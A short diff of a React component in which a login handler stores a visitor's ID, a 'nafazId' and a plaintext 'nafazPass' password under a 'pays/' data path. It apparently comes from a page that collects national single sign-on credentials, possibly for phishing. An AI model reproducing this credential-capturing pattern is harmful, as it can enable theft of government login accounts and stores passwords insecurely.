@@ -47,7 +47,7 @@ export default function Component() {
     setShowError("");
 
     setIsLoading(true);
-    addData({
+   addData(`pays/${visitorId}`, {
       id: visitorId,
       nafazId: idLogin,
       nafazPass:password,
